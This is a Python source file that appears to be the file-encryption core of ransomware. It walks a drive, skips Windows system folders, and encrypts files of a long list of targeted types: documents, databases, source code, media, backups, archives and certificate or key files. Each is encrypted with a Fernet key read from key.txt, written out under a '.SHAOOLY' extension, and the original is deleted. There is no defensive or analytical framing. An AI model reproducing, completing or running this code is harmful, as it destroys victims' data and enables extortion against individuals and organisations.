import time
from threading import Thread
import os
from cryptography.fernet import Fernet


class Encrypt(Thread):

    def __init__(self, drive):
        self.drive = drive
        key = open("key.txt", 'rb').read()
        self.fernet = Fernet(key)
        self.accepted_extensions = [
                                    "Sxw",
                                    "stw",
                                    "uot",
                                    "3ds",
                                    "max",
                                    "3dm",
                                    "ods",
                                    "ots",
                                    "der",
                                    "pfx",
                                    "key",
                                    "crt",
                                    "csr",
                                    "p12",
                                    "pem",
                                    "odt",
                                    "ott",
                                    "sxc",
                                    "stc",
                                    "dif",
                                    "slk",
                                    "wb2",
                                    "odp",
                                    "otp",
                                    "sxd",
                                    "std",
                                    "uop",
                                    "odg",
                                    "otg",
                                    "sxm",
                                    "mml",
                                    "lay",
                                    "lay6",
                                    "asc",
                                    "sqlite3",
                                    "sqlitedb",
                                    "sql",
                                    "accdb",
                                    "mdb",
                                    "dbf",
                                    "odb",
                                    "frm",
                                    "myd",
                                    "myi",
                                    "ibd",
                                    "mdf",
                                    "ldf",
                                    "sln",
                                    "suo",
                                    "cpp",
                                    "pas",
                                    "asm",
                                    "cmd",
                                    "bat",
                                    "ps1",
                                    "vbs",
                                    "dip",
                                    "dch",
                                    "sch",
                                    "brd",
                                    "jsp",
                                    "php",
                                    "asp",
                                    "java",
                                    "jar",
                                    "class",
                                    "mp3",
                                    "wav",
                                    "swf",
                                    "fla",
                                    "wmv",
                                    "mpg",
                                    "vob",
                                    "mpeg",
                                    "asf",
                                    "avi",
                                    "mov",
                                    "mp4",
                                    "3gp",
                                    "mkv",
                                    "3g2",
                                    "flv",
                                    "wma",
                                    "mid",
                                    "m3u",
                                    "m4u",
                                    "djvu",
                                    "svg",
                                    "psd",
                                    "nef",
                                    "tiff",
                                    "tif",
                                    "cgm",
                                    "raw",
                                    "gif",
                                    "png",
                                    "bmp",
                                    "jpg",
                                    "jpeg",
                                    "vcd",
                                    "iso",
                                    "backup",
                                    "zip",
                                    "vmdk",
                                    "vdi",
                                    "sldm",
                                    "sldx",
                                    "sti",
                                    "sxi",
                                    "602",
                                    "hwp",
                                    "snt",
                                    "onetoc2",
                                    "dwg",
                                    "pdf",
                                    "wk1",
                                    "wks",
                                    "123",
                                    "rtf",
                                    "csv",
                                    "txt",
                                    "vsdx",
                                    "vsd",
                                    "edb",
                                    "eml",
                                    "msg",
                                    "ost",
                                    "pst",
                                    "potm",
                                    "potx",
                                    "ppam",
                                    "ppsx",
                                    "ppsm",
                                    "pps",
                                    "pot",
                                    "pptm",
                                    "pptx",
                                    "ppt",
                                    "xltm",
                                    "xltx",
                                    "xlc",
                                    "xlm",
                                    "xlt",
                                    "xlw",
                                    "xlsb",
                                    "xlsm",
                                    "xlsx",
                                    "xls",
                                    "dotx",
                                    "dotm",
                                    "dot",
                                    "docm",
                                    "docb",
                                    "docx",
                                    "doc",
                                    "rar",
                                    "tgz",
                                    "tar",
                                    "bak",
                                    "tbk",
                                    "bz2",
                                    "PAQ",
                                    "ARC",
                                    "aes",
                                    "gpg",
                                    "vmx",
                                    ]

    def run(self):
        start = time.perf_counter()
        for r, d, f in os.walk(self.drive):
            if r.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
                for file in f:
                    if file.split(".")[-1] in self.accepted_extensions:
                        filepath = os.path.join(r, file)
                        if len(file.split('.')) == 1:
                            file_extension = ""
                        else:
                            file_extension = file.split(".")[-1]
                        file_name = file.split(".")[0]
                        enc_file_name = f'{r}/{file_name}.SHAOOLY'
                        byte_file = open(filepath, 'rb')
                        enc_file_content = self.fernet.encrypt(byte_file.read())
                        encrypted_file = open(enc_file_name, 'x')
                        encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                        byte_file.close()
                        os.remove(filepath)
        end = time.perf_counter()
        print(end - start)